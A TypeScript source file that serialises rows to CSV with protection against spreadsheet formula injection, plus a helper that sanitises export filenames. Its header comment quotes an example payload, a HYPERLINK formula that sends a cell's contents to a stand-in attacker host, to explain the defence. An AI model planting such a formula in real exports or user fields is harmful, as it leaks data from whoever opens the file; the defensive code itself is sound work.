/**
 * CSV serialisation with formula-injection protection.
 *
 * A cell beginning with = + - @ (or tab/CR) is executed as a formula when the
 * file is opened in Excel, Sheets, or LibreOffice. Since post titles and author
 * names originate from users, an attacker could ship
 * `=HYPERLINK("http://evil/?d="&A1,"Click")` and exfiltrate the sheet.
 *
 * The fix is to prefix a single quote, which those applications treat as
 * "literal text". See OWASP: CSV Injection.
 */

const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"]

export function escapeCsvCell(value: unknown): string {
  if (value === null || value === undefined) return ""

  let text = String(value)

  if (FORMULA_TRIGGERS.some((trigger) => text.startsWith(trigger))) {
    text = `'${text}`
  }

  // RFC 4180: quote the field and double any inner quotes.
  if (/["\n\r,]/.test(text)) {
    text = `"${text.replaceAll('"', '""')}"`
  }

  return text
}

export interface CsvColumn<T> {
  header: string
  /** Pulls the cell value; escaping is applied afterwards. */
  value: (row: T) => unknown
}

export function toCsv<T>(rows: readonly T[], columns: readonly CsvColumn<T>[]): string {
  const headerLine = columns.map((column) => escapeCsvCell(column.header)).join(",")
  const dataLines = rows.map((row) =>
    columns.map((column) => escapeCsvCell(column.value(row))).join(",")
  )

  // CRLF per RFC 4180; the BOM makes Excel read it as UTF-8 rather than latin-1.
  return `﻿${[headerLine, ...dataLines].join("\r\n")}`
}

/**
 * Builds a safe `Content-Disposition` filename.
 * Anything outside the allowlist is dropped so a crafted name cannot inject
 * header directives or traverse a path.
 */
export function csvFilename(base: string, from: string, to: string): string {
  const safeBase = base.replace(/[^a-zA-Z0-9-_]/g, "").slice(0, 40) || "export"
  return `${safeBase}_${from}_to_${to}.csv`
}
